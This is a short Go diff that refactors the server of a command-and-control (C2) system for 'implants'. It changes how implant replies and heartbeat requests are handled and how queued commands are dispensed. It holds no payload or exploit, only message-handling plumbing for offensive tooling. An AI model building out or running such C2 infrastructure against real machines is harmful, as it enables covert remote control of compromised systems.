@@ -33,7 +33,9 @@ const (
 
 // Called when receiving a non-heartbeat message from implant
 // TODO: Should do some other stuff rather than just printing it out
-func (c2 *c2) handleReply(ip string, reply *messages.ImplantReply) {
+func (c2 *c2) handleReply(ip string, reply *messages.CheckCmdRequest) {
+	reply.RandomPadding = []byte{}
+
 	log.SetPrefix(RED + "[" + RESET + ip + RED + "]" + RESET + " ")
 	if err := reply.GetError(); err != 0 {
 		log.Println(RED + "Error: " + types.ErrorToString[err] + RESET)
@@ -54,8 +56,7 @@ func get_ip(ctx context.Context) string {
 // Server listening function
 // Called automagically by grpc
 func (c2 *c2) CheckCommandQueue(ctx context.Context, req *messages.CheckCmdRequest) (*messages.CheckCmdReply, error) {
-	switch u := req.Message.(type) {
-	case *messages.CheckCmdRequest_Heartbeat:
+	if req.GetHeartbeat() > 0 {
 		select {
 		case msg, ok := <-c2.queue:
 			if ok {
@@ -64,12 +65,10 @@ func (c2 *c2) CheckCommandQueue(ctx context.Context, req *messages.CheckCmdReque
 				panic("C2 Message Queue closed")
 			}
 		default:
+			// No message in queue
 		}
-	case *messages.CheckCmdRequest_Reply:
-		c2.handleReply(get_ip(ctx), u.Reply)
-	default:
-		fmt.Println(req, u)
-		panic("Didn't received a valid message")
+	} else {
+		c2.handleReply(get_ip(ctx), req)
 	}
 
 	// We don't have anything to actually send back, so lets just reply with a heartbeat
